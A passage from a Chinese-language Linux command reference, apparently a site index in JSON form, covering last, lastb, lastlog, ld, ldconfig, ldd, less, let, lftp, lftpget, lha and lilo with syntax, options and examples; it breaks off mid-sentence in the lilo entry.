命令】last","url":"/linux-command/last/","content":"\n列出目前与过去登入系统的用户相关信息\n\n## 补充说明\n\n**last命令** 用于显示用户最近登录信息。单独执行last命令，它会读取`/var/log/wtmp`的文件，并把该给文件的内容记录的登入系统的用户名单全部显示出来。\n\n###  语法\n\n```shell\nlast(选项)(参数)\n```\n\n###  选项\n\n```shell\n-a：把从何处登入系统的主机名称或ip地址，显示在最后一行；\n-d：将IP地址转换成主机名称；\n-f <记录文件>：指定记录文件。\n-n <显示列数>或-<显示列数>：设置列出名单的显示列数；\n-R：不显示登入系统的主机名称或IP地址；\n-x：显示系统关机，重新开机，以及执行等级的改变等信息。\n```\n\n###  参数\n\n*   用户名：显示用户登录列表；\n*   终端：显示从指定终端的登录列表。\n\n###  实例\n\nlast命令用了显示用户登录情况，以下是直接显示固定行数的记录：\n\n```shell\nlast -10\nroot     pts/0        221.6.45.34      Tue Dec 17 09:40   still logged in\nroot     pts/0        221.6.45.34      Mon Dec 16 09:00 - 11:57  (02:56)\nroot     pts/0        222.94.97.122    Sun Dec 15 20:39 - 23:28  (02:48)\nroot     pts/0        222.95.209.80    Sat Dec 14 14:39 - 14:58  (00:18)\nroot     pts/0        221.6.45.34      Thu Dec 12 16:55 - 17:37  (00:41)\nroot     pts/0        49.65.139.195    Wed Dec 11 20:40 - 21:16  (00:35)\nroot     pts/0        49.65.139.195    Wed Dec 11 19:46 - 20:03  (00:17)\nroot     pts/0        221.6.45.34      Tue Dec 10 14:41 - 15:52  (01:10)\nroot     pts/0        221.6.45.34      Mon Dec  9 17:24 - 17:30  (00:06)\nroot     pts/0        221.6.45.34      Mon Dec  9 09:38 - 11:41  (02:02)\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","last"]},{"title":"【Linux 命令】lastb","url":"/linux-command/lastb/","content":"\n列出登入系统失败的用户相关信息\n\n## 补充说明\n\n**lastb命令** 用于显示用户错误的登录列表，此指令可以发现系统的登录异常。单独执行lastb命令，它会读取位于`/var/log`目录下，名称为btmp的文件，并把该文件内容记录的登入失败的用户名单，全部显示出来。\n\n###  语法\n\n```shell\nlastb(选项)(参数)\n```\n\n###  选项\n\n```shell\n-a：把从何处登入系统的主机名称或ip地址显示在最后一行；\n-d：将IP地址转换成主机名称；\n-f<记录文件>：指定记录文件；\n-n<显示列数>或-<显示列数>：设置列出名单的显示列数；\n-R：不显示登入系统的主机名称或IP地址；\n-x：显示系统关机，重新开机，以及执行等级的改变等信息。\n```\n\n###  参数\n\n*   用户名：显示中的用户的登录列表；\n*   终端：显示从指定终端的登录列表。\n\n###  实例\n\n首次运行lastb命令会报下的错误：\n\n```shell\nlastb: /var/log/btmp: No such file or directory\nPerhaps this file was removed by the operator to prevent logging lastb info.\n```\n\n只需建立这个不存在的文件即可。\n\n```shell\ntouch /var/log/btmp\n```\n\n使用ssh的登录失败不会记录在btmp文件中。\n\n```shell\nlastb | head\nroot     ssh:notty    110.84.129.3     Tue Dec 17 06:19 - 06:19  (00:00)\nroot     ssh:notty    110.84.129.3     Tue Dec 17 04:05 - 04:05  (00:00)\nroot     ssh:notty    110.84.129.3     Tue Dec 17 01:52 - 01:52  (00:00)\nroot     ssh:notty    110.84.129.3     Mon Dec 16 23:38 - 23:38  (00:00)\nleonob   ssh:notty    222.211.85.18    Mon Dec 16 22:18 - 22:18  (00:00)\nleonob   ssh:notty    222.211.85.18    Mon Dec 16 22:18 - 22:18  (00:00)\nroot     ssh:notty    110.84.129.3     Mon Dec 16 21:25 - 21:25  (00:00)\nroot     ssh:notty    110.84.129.3     Mon Dec 16 19:12 - 19:12  (00:00)\nroot     ssh:notty    110.84.129.3     Mon Dec 16 17:00 - 17:00  (00:00)\nadmin    ssh:notty    129.171.193.99   Mon Dec 16 16:52 - 16:52  (00:00)\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","lastb"]},{"title":"【Linux 命令】lastlog","url":"/linux-command/lastlog/","content":"\n显示系统中所有用户最近一次登录信息\n\n## 补充说明\n\n**lastlog命令** 用于显示系统中所有用户最近一次登录信息。\n\nlastlog文件在每次有用户登录时被查询。可以使用lastlog命令检查某特定用户上次登录的时间，并格式化输出上次登录日志`/var/log/lastlog`的内容。它根据UID排序显示登录名、端口号（tty）和上次登录时间。如果一个用户从未登录过，lastlog显示` **Never logged** `。注意需要以root身份运行该命令。\n\n###  语法\n\n```shell\nlastlog(选项)\n```\n\n###  选项\n\n```shell\n-b<天数>：显示指定天数前的登录信息；\n-h：显示召集令的帮助信息；\n-t<天数>：显示指定天数以来的登录信息；\n-u<用户名>：显示指定用户的最近登录信息。\n```\n\n###  实例\n\n```shell\nlastlog\nUsername         Port     From             Latest\nroot             pts/0    221.6.45.34      Tue Dec 17 09:40:48 +0800 2013\nbin                                         **Never logged in** \ndaemon                                      **Never logged in** \nadm                                         **Never logged in** \nlp                                          **Never logged in** \nsync                                        **Never logged in** \nshutdown                                    **Never logged in** \nhalt                                        **Never logged in** \nmail                                        **Never logged in** \nnews                                        **Never logged in** \nuucp                                        **Never logged in** \noperator                                    **Never logged in** \ngames                                       **Never logged in** \ngopher                                      **Never logged in** \nftp                                         **Never logged in** \nnobody                                      **Never logged in** \nvcsa                                        **Never logged in** \nntp                                         **Never logged in** \nsshd                                        **Never logged in** \nnscd                                        **Never logged in** \nldap                                        **Never logged in** \npostfix                                     **Never logged in** \nwww                                         **Never logged in** \nmysql                                       **Never logged in** \n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","lastlog"]},{"title":"【Linux 命令】ld","url":"/linux-command/ld/","content":"\n将目标文件连接为可执行程序\n\n## 补充说明\n\n**ld命令** 是GNU的连接器，将目标文件连接为可执行程序。\n\n###  语法 \n\n```shell\nld(选项)(参数)\nld [options] objfile ...\n```\n\n###  选项 \n\n```shell\n-o：指定输出文件名；\n-e：指定程序的入口符号。\n```\n\n###  参数 \n\n目标文件：指定需要连接的目标文件。\n\n### 实例\n\n这告诉ld通过将文件 `/lib/crt0.o` 与 `hello.o` 和库 `libc.a` 链接起来，生成一个名为 `output` 的文件，该文件将来自标准搜索目录。\n\n```shell\nld -o <output> /lib/crt0.o hello.o -lc\nld -o output /lib/crt0.o hello.o -lc\n```\n\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","ld"]},{"title":"【Linux 命令】ldconfig","url":"/linux-command/ldconfig/","content":"\n动态链接库管理命令\n\n## 补充说明\n\n**ldconfig命令** 的用途主要是在默认搜寻目录`/lib`和`/usr/lib`以及动态库配置文件`/etc/ld.so.conf`内所列的目录下，搜索出可共享的动态链接库（格式如lib*.so*）,进而创建出动态装入程序(ld.so)所需的连接和缓存文件。缓存文件默认为`/etc/ld.so.cache`，此文件保存已排好序的动态链接库名字列表，为了让动态链接库为系统所共享，需运行动态链接库的管理命令ldconfig，此执行程序存放在`/sbin`目录下。\n\nldconfig通常在系统启动时运行，而当用户安装了一个新的动态链接库时，就需要手工运行这个命令。\n\n###  语法\n\n```shell\nldconfig [-v|--verbose] [-n] [-N] [-X] [-f CONF] [-C CACHE] [-r ROOT] [-l] [-p|--print-cache] [-c FORMAT] [--format=FORMAT] [-V] -?|--[help|--usage] path... \n```\n\n###  选项\n\n```shell\n-v或--verbose：用此选项时，ldconfig将显示正在扫描的目录及搜索到的动态链接库，还有它所创建的连接的名字。\n-n：用此选项时,ldconfig仅扫描命令行指定的目录，不扫描默认目录（/lib、/usr/lib），也不扫描配置文件/etc/ld.so.conf所列的目录。\n-N：此选项指示ldconfig不重建缓存文件（/etc/ld.so.cache），若未用-X选项，ldconfig照常更新文件的连接。\n-X：此选项指示ldconfig不更新文件的连接，若未用-N选项，则缓存文件正常更新。\n-f CONF：此选项指定动态链接库的配置文件为CONF，系统默认为/etc/ld.so.conf。\n-C CACHE：此选项指定生成的缓存文件为CACHE，系统默认的是/etc/ld.so.cache，此文件存放已排好序的可共享的动态链接库的列表。\n-r ROOT：此选项改变应用程序的根目录为ROOT（是调用chroot函数实现的）。选择此项时，系统默认的配置文件/etc/ld.so.conf，实际对应的为ROOT/etc/ld.so.conf。如用-r /usr/zzz时，打开配置文件/etc/ld.so.conf时，实际打开的是/usr/zzz/etc/ld.so.conf文件。用此选项，可以大大增加动态链接库管理的灵活性。\n-l：通常情况下,ldconfig搜索动态链接库时将自动建立动态链接库的连接，选择此项时，将进入专家模式，需要手工设置连接，一般用户不用此项。\n-p或--print-cache：此选项指示ldconfig打印出当前缓存文件所保存的所有共享库的名字。\n-c FORMAT 或 --format=FORMAT：此选项用于指定缓存文件所使用的格式，共有三种：old(老格式)，new(新格式)和compat（兼容格式，此为默认格式）。\n-V：此选项打印出ldconfig的版本信息，而后退出。\n-? 或 --help 或 --usage：这三个选项作用相同，都是让ldconfig打印出其帮助信息，而后退出。\n```\n\n **ldconfig几个需要注意的地方：** \n\n1.  往`/lib`和`/usr/lib`里面加东西，是不用修改`/etc/ld.so.conf`的，但是完了之后要调一下ldconfig，不然这个library会找不到。\n2.  想往上面两个目录以外加东西的时候，一定要修改`/etc/ld.so.conf`，然后再调用ldconfig，不然也会找不到。\n3.  比如安装了一个mysql到`/usr/local/mysql`，mysql有一大堆library在`/usr/local/mysql/lib`下面，这时就需要在`/etc/ld.so.conf`下面加一行`/usr/local/mysql/lib`，保存过后ldconfig一下，新的library才能在程序运行时被找到。\n4.  如果想在这两个目录以外放lib，但是又不想在`/etc/ld.so.conf`中加东西（或者是没有权限加东西）。那也可以，就是export一个全局变量LD_LIBRARY_PATH，然后运行程序的时候就会去这个目录中找library。一般来讲这只是一种临时的解决方案，在没有权限或临时需要的时候使用。\n5.  ldconfig做的这些东西都与运行程序时有关，跟编译时一点关系都没有。编译的时候还是该加-L就得加，不要混淆了。\n6.  总之，就是不管做了什么关于library的变动后，最好都ldconfig一下，不然会出现一些意想不到的结果。不会花太多的时间，但是会省很多的事。\n7.  再有，诸如libdb-4.3.so文件头中是会含有库名相关的信息的（即含“libdb-4.3.so”，可用strings命令察看），因此仅通过修改文件名以冒充某已被识别的库（如libdb-4.8.so）是行不通的。为此可在编译库的Makefile中直接修改配置信息，指定特别的库名。\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","ldconfig"]},{"title":"【Linux 命令】ldd","url":"/linux-command/ldd/","content":"\n打印程序或者库文件所依赖的共享库列表\n\n## 补充说明\n\n**ldd命令** 用于打印程序或者库文件所依赖的共享库列表。\n\n###  语法\n\n```shell\nldd(选项)(参数)\n```\n\n###  选项\n\n```shell\n--version：打印指令版本号；\n-v：详细信息模式，打印所有相关信息；\n-u：打印未使用的直接依赖；\n-d：执行重定位和报告任何丢失的对象；\n-r：执行数据对象和函数的重定位，并且报告任何丢失的对象和函数；\n--help：显示帮助信息。\n```\n\n###  参数\n\n文件：指定可执行程序或者文库。\n\n###  其他介绍\n\n首先ldd不是一个可执行程序，而只是一个shell脚本\n\nldd能够显示可执行模块的dependency，其原理是通过设置一系列的环境变量，如下：`LD_TRACE_LOADED_OBJECTS、LD_WARN、LD_BIND_NOW、LD_LIBRARY_VERSION、LD_VERBOSE`等。当`LD_TRACE_LOADED_OBJECTS`环境变量不为空时，任何可执行程序在运行时，它都会只显示模块的dependency，而程序并不真正执行。要不你可以在shell终端测试一下，如下：\n\n```shell\nexport LD_TRACE_LOADED_OBJECTS=1\n```\n\n再执行任何的程序，如ls等，看看程序的运行结果。\n\nldd显示可执行模块的dependency的工作原理，其实质是通过ld-linux.so（elf动态库的装载器）来实现的。我们知道，ld-linux.so模块会先于executable模块程序工作，并获得控制权，因此当上述的那些环境变量被设置时，ld-linux.so选择了显示可执行模块的dependency。\n\n实际上可以直接执行ld-linux.so模块，如：`/lib/ld-linux.so.2 --list program`（这相当于ldd program）\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","ldd"]},{"title":"【Linux 命令】less","url":"/linux-command/less/","content":"\n分屏上下翻页浏览文件内容\n\n## 补充说明\n\n**less命令** 的作用与more十分相似，都可以用来浏览文字档案的内容，不同的是less命令允许用户向前或向后浏览文件，而more命令只能向前浏览。用less命令显示文件时，用PageUp键向上翻页，用PageDown键向下翻页。要退出less程序，应按Q键。\n\n###  语法 \n\n```shell\nless(选项)(参数)\n```\n\n###  选项 \n\n```shell\n-e：文件内容显示完毕后，自动退出；\n-f：强制显示文件；\n-g：不加亮显示搜索到的所有关键词，仅显示当前显示的关键字，以提高显示速度；\n-l：搜索时忽略大小写的差异；\n-N：每一行行首显示行号；\n-s：将连续多个空行压缩成一行显示；\n-S：在单行显示较长的内容，而不换行显示；\n-x<数字>：将TAB字符显示为指定个数的空格字符。\n```\n\n###  参数 \n\n文件：指定要分屏显示内容的文件。\n\n## 实例\n\n```shell\nsudo less /var/log/shadowsocks.log\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","less"]},{"title":"【Linux 命令】let","url":"/linux-command/let/","content":"\n简单的计算器，执行算术表达式。\n\n## 概要\n\n```shell\nlet arg [arg ...]\n```\n\n## 主要用途\n\n- 执行一个或多个算术表达式。\n\n## 参数\n\narg：算术表达式\n\n## 返回值\n\n当`let`最后一个执行的表达式的计算结果为0时返回`1`，否则返回`0`。\n当`let`执行的表达式的除数为0时，返回`1`并报错。\n\n## 运算符优先级递减表\n\n|**运算符**|**描述**|\n|:-------:|:-------:|\n|```id++, id--```|```变量后增量、变量后减量```|\n|```++id, --id```|```变量预增量、变量预减量```|\n|```-, +```|```正号、负号```|\n|```!, ~```|```逻辑否、按位取反```|\n|```**```|```幂运算```|\n|```*, /, %```|```乘法、除法、取余```|\n|```+, -```|```加法、减法```|\n|```<<, >>```|```按位左移、右移```|\n|```<=, >=, <, >```|```比较```|\n|```==, !=```|```等于、不等于```|\n|```&```|```按位与```|\n|```^```|```按位异或```|\n|```\\|```|```按位或```|\n|```&&```|```逻辑与```|\n|```\\|\\|```|```逻辑或```|\n|```expr ? expr : expr```|```条件运算符（三元运算符）```|\n|```=, *=, /=, %=, +=, -=,```<br>```<<=, >>=, &=, ^=, \\|=```|```赋值```|\n\n\n## 例子\n\n```shell\n# 尝试直接在终端中执行算术表达式（就像在python的IDLE）。\n3+4\nbash：3+4：command not found...\n# 换一种方式。\n3 + 4\nbash：3：command not found...\n# 看来不行。\n```\n\n```shell\n# let命令赋值。\nlet a=3**4\necho ${a}\n# 显示81。\n# ((...))和let命令等效。\n((a=3**4))\n```\n\n```shell\n# let常用于变量赋值，而外部命令expr可直接返回表达式的值。\nlet 3+4\n# 没有显示7。\n# 执行后显示7，注意空格。\nexpr 3 + 4\n```\n\n```shell\n# 条件表达式。\nif ((8>4)); then\n  echo '8 is greater than 4.'\nelse\n  echo 'error'\nfi\n# 注意空格。\nif [[ 12 -le 10 ]]; then\n  echo 'error'\nelse\n  echo '12 is greater than 10.'\nfi\n```\n\n```shell\n# 可以通过declare命令设置整型属性的方法来进行算术运算。\n# local命令与此类似。\n\n# 没有指定整型属性，输出为字符串'a+b'。\ndeclare a=3 b=4 c\nc=a+b\necho ${c}\n# 不过可以使用以下方式赋值。\nc=$((a+b))\necho ${c}\n# 显示7\n\n# 设置了整型属性就可以直接加了。\ndeclare -i a=3 b=4 c\nc=a+b\necho ${c}\n# 同上。\ndeclare -i a\na=2*3\necho ${a}\n# 显示6。\n```\n\n### 注意\n\n1. 该命令是bash内建命令，相关的帮助信息请查看`help`命令。\n\n2. 执行算术计算的命令除了`let`，还有外部命令`expr`、`bc`等。\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","let"]},{"title":"【Linux 命令】lftp","url":"/linux-command/lftp/","content":"\n优秀的文件客户端程序\n\n## 补充说明\n\n**lftp命令** 是一款优秀的文件客户端程序，它支持ftp、SETP、HTTP和FTPs等多种文件传输协议。lftp支持tab自动补全，记不得命令双击tab键，就可以看到可能的选项了。\n\n###  语法\n\n```shell\nlftp(选项)(参数)\n```\n\n###  选项\n\n```shell\n-f：指定lftp指令要执行的脚本文件；\n-c：执行指定的命令后退出；\n--help：显示帮助信息；\n--version：显示指令的版本号。\n```\n\n###  参数\n\n站点：要访问的站点的ip地址或者域名。\n\n###  实例\n\n **登录ftp** \n\n```shell\nlftp 用户名:密码@ftp地址:传送端口（默认21）\n```\n\n也可以先不带用户名登录，然后在接口界面下用login命令来用指定账号登录，密码不显示。\n\n **查看文件与改变目录** \n\n```shell\nls\ncd 对应ftp目录\n```\n\n **下载** \n\nget当然是可以的，还可以：\n\n```shell\nmget -c *.pdf    #把所有的pdf文件以允许断点续传的方式下载。\nmirror aaa/      #将aaa目录整个的下载下来，子目录也会自动复制。\npget -c -n 10 file.dat   #以最多10个线程以允许断点续传的方式下载file.dat，可以通过设置pget:default-n的值而使用默认值。\n```\n\n **上传** \n\n同样的put、mput都是对文件的操作，和下载类似。\n\n```shell\nmirror -R 本地目录名\n```\n\n将本地目录以迭代（包括子目录）的方式反向上传到ftp site。\n\n **模式设置** \n\n```shell\nset ftp:charset gbk\n```\n\n远程ftp site用gbk编码，对应的要设置为utf8,只要替换gbk为utf8即可。\n\n```shell\nset file:charset utf8\n```\n\n本地的charset设定为utf8,如果你是gbk，相应改掉。\n\n```shell\nset ftp:passive-mode 1\n```\n\n使用被动模式登录，有些site要求必须用被动模式或者主动模式才可以登录，这个开关就是设置这个的。0代表不用被动模式。\n\n **书签** \n\n其实命令行也可以有书签，在lftp终端提示符下：\n\n```shell\nbookmark add ustc\n```\n\n就可以把当前正在浏览的ftp site用ustc作为标签储存起来。以后在shell终端下，直接`lftp ustc`就可以自动填好用户名和密码，进入对应的目录了。\n\n```shell\nbookmark edit\n```\n\n会调用编辑器手动修改书签。当然，也可以看到，这个书签其实就是个简单的文本文件。密码，用户名都可以看到。\n\n **配置文件** \n\n```shell\nvim /etc/lftp.conf\n```\n\n一般，我会添加这几行：\n\n```shell\nset ftp:charset gbk\nset file:charset utf8\nset pget:default-n 5\n```\n\n这样，就不用每次进入都要打命令了。其他的set可以自己tab然后help来看。\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","lftp"]},{"title":"【Linux 命令】lftpget","url":"/linux-command/lftpget/","content":"\n调用lftp指令下载指定的文件\n\n## 补充说明\n\n**lftpget命令** 通过调用lftp指令下载指定的文件。\n\n###  语法\n\n```shell\nlftpget(选项)(参数)\n```\n\n###  选项\n\n```shell\n-c：继续先前的下载；\n-d：输出调试信息；\n-v：输出详细信息。\n```\n\n###  参数\n\n文件：指定要下载的文件，文件必须是合法的URL路径。\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","lftpget"]},{"title":"【Linux 命令】lha","url":"/linux-command/lha/","content":"\n压缩或解压缩lzh格式文件\n\n## 补充说明\n\n**lha命令** 是从lharc演变而来的压缩程序，文件经它压缩后，会另外产生具有`.lzh`扩展名的压缩文件。\n\n###  选项\n\n```shell\n-a或a：压缩文件，并加入到压缩文件内。\n-a<0/1/2>/u</0/1/2>   压缩文件时，采用不同的文件头。\n-c或c：压缩文件，重新建构新的压缩文件后，再将其加入。\n-d或d：从压缩文件内删除指定的文件。\n-<a/c/u>d或<a/c/u>d：压缩文件，然后将其加入，重新建构，更新压缩文件或，删除原始文件，也就是把文件移到压缩文件中。\n-e或e：解开压缩文件。\n-f或f：强制执行lha命令，在解压时会直接覆盖已有的文件而不加以询问。\n-g或g：使用通用的压缩格式，便于解决兼容性的问题。\n-<e/x>i或<e/x>i：解开压缩文件时，忽略保存在压缩文件内的文件路径，直接将其解压后存放在现行目录下或是指定的目录中。\n-l或l：列出压缩文件的相关信息。\n-m或m：此选项的效果和同时指定\"-ad\"选项相同。\n-n或n：不执行指令，仅列出实际执行会进行的动作。\n-<a/u>o或<a/u>o：采用lharc兼容格式，将压缩后的文件加入，更新压缩文件。\n-p或p：从压缩文件内输出到标准输出设备。\n-q或q：不显示指令执行过程。\n-t或t：检查备份文件内的每个文件是否正确无误。\n-u或u：更换较新的文件到压缩文件内。\n-u</0/1/2>或u</0/1/2>：在文件压缩时采用不同的文件头，然后更新到压缩文件内。\n-v或v：详细列出压缩文件的相关信息。\n-<e/x>w=<目的目录>或<e/x>w=<目的目录>：指定解压缩的目录。\n-x或x：解开压缩文件。\n-<a/u>z或<a/u>z：不压缩文件，直接把它加入，更新压缩文件。\n```\n\n###  实例\n\n```shell\nlha -a abc.lhz a.b         #压缩a.b文件，压缩后生成 abc.lhz 文件\nlha -a abc2 /home/hnlinux  #压缩目录\nlha -xiw=agis abc          #解压文件abc，到当前目录\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","lha"]},{"title":"【Linux 命令】lilo","url":"/linux-command/lilo/","content":"\n安装核心载入开机管理程序\n\n## 补充说明\n\n**lilo命令** 用于安装核心载入，开机管理程序。lilo是个Linux系统核心载入程序，同时具备管理开机的功能。单独执行lilo指令，它会读取/etc/lilo.conf配置文件，然后根据其内容安装lilo。\n\nLinux lilo已经成为所有 Linux 发行版的标准组成部分。作为一个 较老的/最老的 Linux 引导加载程序，它那不断壮大的 Linux 社区支持使它能够随时间的推移而发展，并始终能够充当一个可用的现代引导加载程序。有一些新的功能，比如增强的用户界面，以及对能够突破原来 1024-柱面限制的新 BIOS 功能的利用。\n\n虽然 LILO 仍在不断地发展，但 LILO 工作原理的基本概念保持不变。\n\n###  语法\n\n```shell\nlilo(选项)\n```\n\n###  选项\n\n```shell\n-b<外围设备代号>：指定安装lilo之处的外围设备代号；\n-c：使用紧致映射模式；\n-C<配置文件>：指定lilo的配置文件；\n-d<延迟时间>：设置开机延迟时间；\n-D<识别标签>：指定开机后预设启动的操作系统，或系统核心识别标签；\n-f<几何参数文件>：指定磁盘的几何参数配置文件；\n-i<开机磁区文件>：指定欲使用的开机磁区文件，预设是/boot目录里的boot.b文件；\n-I<识别标签>：显示系统核心存放之处；\n-l：产生线形磁区地址；\n-m<映射文件>：指定映射文件；\n-P<fix/ignore>：决定要修复或忽略分区表的错误；\n-q：列出映射的系统核心文件；\n-r<根目录>：设置系统启动时欲挂入成为根目录的目录；\n-R<执行指令>：设置下次启动系统时，首先执行的指令；\n-s<备份文件>：指定备份文件；\n-S<备份文件>：强制指定备份文件；\n-t：不执行指令，仅列出实际执行会进行的动作；\n-u<外围色设备代号>：删除lilo；\n-U<外围设备代号>：此选项的效果和指定\"-u\"参数类似，当不检查时间戳记；\n-v：显示指令执行过程；\n-V：显示版本信息。\n```\n\n###  实例\n\n **使用 LILO 作为引导加载程序** \n\n要使用 LILO 作为引导加载程序，需要做的事情取决于是要进行全新安装还是要让已经安装的 Linux 改为使用 LILO。如果是要进行全新安装，那么直接跳转到 配置 LILO 那一节。如果已经安装了某个 Linux 发行版，那么通常可以选择安装并配置 LILO（并可以将机器引导到新的 Linux 安装）。\n\n要将现有的 Linux 迁移到 LILO，首先必须获得最新版本的 LILO（见 参考资料）。在做任何其他事情之前，建议您确保在手边拥有一张 Linux 引导盘 —— 如果偶而弄错了某些地方，它可以提供很大的帮助，能够恢复到初始的 Linux 配置！将 LILO 安装到系统中之后，让它接管 MBR 非常简单。以 root 用户身份输入：\n\n```shell\n/sbin/lilo -v -v\n```\n\n这将使用当前的 LILO 默认值，抹去 MBR 中当前所有内容。不过，请阅读 配置 LILO，以确保能够按预期引导起来。也要注意，如果想要在同一机器上运行 Windows 和 Linux，那么应该先安装 Windows OS，然后再安装 Linux OS，这样，在 Linux 安装中所选择的引导加载程序就不会被 Windows 引导加载程序所覆盖。与 Linux 引导加载程序不同，多数 Window 引导加载程序不支持引导 Linux。如果已经先安装了 Linux，那么只需要自己创建一张 Linux 引导盘，这样就可以在安装完 Windows 之后，回到 Linux 安装中并重写 MBR。\n\n **配置 LILO** \n\nLILO 的配置都是通过位于 /etc/lilo.conf 的一个配置文件来完成的。清单 1 给出了一个示例配置，使用的是我的家用机器，支持 Linux 和 Windows 机器的双重引导。了解我的工作站的基本配置，就可以想像出这些配置是如何与实际机器相关联的：\n\n主 HDD（物理磁盘 1）上安装了 Windows XP（最初机器上只有它）。在 Linux 术语中，这个 HDD 是 /dev/hda（在 grub 术语中是 hd0,0）。\n\n从 HDD（物理磁盘 2）上安装了 Red Hat Linux；root 分区位于这个硬盘驱动器的第三个分区，即 /dev/hdb3（在 GRUB 术语中是 hd1,3）。\n\nlilo.conf 示例文件：\n\n```shell\nboot=/dev/hda\nmap=/boot/map\ninstall=/boot/boot.b\nprompt\ntimeout=100\ncompact\ndefault=Linux\nimage=/boot/vmlinuz-2.4.18-14\n\tlabel=Linux\n\troot=/dev/hdb3\n\tread-only\n\tpassword=linux\nother=/dev/hda\n\tlabel=WindowsXP\n```\n\n配置文件选项说明：\n\n*   boot= 行告诉 LILO 在哪里安装引导加载程序。在上面的示例中，将把它安装到第一块硬盘的 MBR。也可以选择将 LILO 安装到 /dev/hdb3（示例中的 Linux 分区），这样需要向 /dev/hda 安装另一个引导加载程序，并令其指向 LILO 引导加载程序；然后只需要让 LILO 作为二级引导加载程序。通常，引导加载程序应该位于 /dev/hda。还可以将这个参数指向软盘驱动器（最常见的是 /dev/fd0），来制做 LILO 软盘引导磁盘。\n*   map= 指向引导期间 LILO 内部使用的映射文件。当使用 /sbin/lilo 命令安装 LILO 时， 它会自动生成这个文件，其中包含有描述符表（还有其他内容）。建议不要改动这个文件！\n*   install= 是 LILO 在引导过程中内部使用的文件之一。它同时包含有引导加载程序的主要部分和二级部分。boot.b 文件的 一个片段被写入到 MBR（引导加载程序的主要部分），它会指向那个映射，接下来指向二级引导加载程序。同样，不要改动它！\n*   prompt= 告诉 LILO 使用用户界面（本例中给出了两个选择 —— Linux 和 WindowsXP）。除了使用 prompt/user 界面以外，在适当情况下还可以为 Linux 内核等指定具体的参数。如果不在配置文件中指定此选项，那么 LILO 将引导到 默认的 OS，不发生任何用户交互，也不会等待。（但是请注意，如果在引导时按下了 SHIFT，那么还是可以得到提示，当不想把 引导加载程序暴露给普通用户时，这非常有用）。\n*   timeout= 是引导提示在自动引导默认 OS（本例中是 Linux）之前的等待时间（以十分之一秒为单位）。 如果在 lilo.conf 没有指定 prompt，那么这个参数就会被忽略。\n*   compact 选项可以大大加速引导过程，它会将连续的读磁盘的请求合并为一个单独的请求。不过，这可能是 一件祸福参半的事情，因为我在论坛上看到过很多贴子提到了关于此选项的问题。当希望从软盘引导时，这个选项尤其有用。\n*   default= 选项告诉 LILO 默认使用哪个映像进行引导，比如在等待超时之后。这与 lilo.conf 文件中的某个映像的 标签相关联。如果没有在配置文件中指定此选项，那么它将引导文件中指定的第一个映像。\n*   对于允许用户引导到的每一个 Linux 版本，都应该指定 image= 及以下三个选项。image 选项指定希望 引导到的内核版本。\n*   label= 标明了在运行期间希望能够从用户界面引导的不同 OS。另外，这个标签用于指定引导的默认 OS。 （注意：标签名称中避免出现空格；否则，引导那个文件时会出现无法预期的错误。）\n*   root= 告诉 LILO OS 文件系统实际所在的位置。在我们的示例中为 /dev/hdb3，即第二块硬盘上的第三个分区。\n*   read-only 告诉 LILO 以只读的方式初始引导到文件系统。OS 一旦完全引导起来，就会以读写方式挂载。\n*   password= 允许您为将要引导到的特定 OS 设置口令。不幸的是，这个口令是以可读文本的方式保存在 lilo.conf 文件中，所以，所有人都能够读取它。如果需要，还可以对想要引导自的每个操作系统设置口令（在我们的示例中，只为 Linux 的引导 设置了一个口令）。\n*   other= 的动作类似于 image 和 root 选项的组合，但是用于除了 Linux 以外的其他操作系统。 在我们的示例中，它告诉 LILO 到哪里去找到 Windows OS（位于第一块硬盘的第一个分区）。如果先安装 Windows，后安装 Linux，通常会是这样。\n*   label= 与所有其他 label 选项相同。\n\n在 lilo.conf 文件中可以使用很多其他参数，不过清单 1 中的参数就足以让机器可用了。要获得关于 lilo.conf 的这些以及其他参数的 进一步资料，请参考手册页（man lilo.conf）。由于在引导时不会读取 lilo.conf，所以，当这个文件有改动时，需要“更新”MBR。 如果不完成此步骤就重新引导，那么对 lilo.conf 的修改不会在启动中反映出来。与先前将 LILO 写入 MBR 类似，需要运行：\n\n```shell\n/sbin/lilo -v -v\n```\n\n`-v -v`标记会为您给出非常详细的输出。当像我们那样运行 LILO 时，有很多参数可以指定。 参阅手册页以获得更进一步的信息（man lilo）。\n\n **初始引导过程** \n\n当 LILO 初始引导时，它会按次序打印出每个字母 —— L-I-L-O。如果所有字母都显示出来，那么第一阶段引导就成功了。缺少任何内容 都表示出现了问题：\n\nL：第一阶段引导加载程序已经被加载。如果 LILO 停止在这里，那么是在引导第二阶段引导加载程序时出现了问题。这通常会伴随有一个错误代码。 在这个阶段的常见问题是介质问题，或者在 lilo.conf 文件中指定了不正确的磁盘参数。\n\nLI：第二阶段引导加载程序已经被加载。LILO 在此处停止表示第二阶段引导加载程序不能被执行。同样，这可能是因为出现了与只显示 L 类似的问题： 正在加载，或者因 boot.b 文件被破坏、移动或删除而不能加载。\n\nLIL：第二阶段引导加载程序正在被执行。此时，可能会再次出现介质问题，或者映射文件（如 lilo.conf 文件中所指定的）在寻找描述符表时 可能会出现问题。\n\nLIL?：加载到与上面相同的阶段。这通常意味着加载第二阶段引导加载程序使用了错误的地址，最常见的原因是 boot.b 所在的位置与 lilo.conf 文件所指定的不同。\n\nLIL-：加载到与上面相同的阶段。加载描述符表时出现问题，最常见的原因是描述符表错误。\n\nLILO：LILO 成功被加载，没有出现任何错误。\n\n **引导时的附加配置** \n\nLILO 被成功加载后，将看到 LILO 提示符。还是使用前面的示例 lilo.conf 文件，此时将有两个选择，可能对 LILO 新手来说并不直观。首先，可以 让 LILO 超时（10 秒后），这将引导`/dev/hdb3`，即 Linux 分区。另外，可以按下 TAB 键，这将列出将要引导的操作系统选项。在我们的示例 lilo.conf 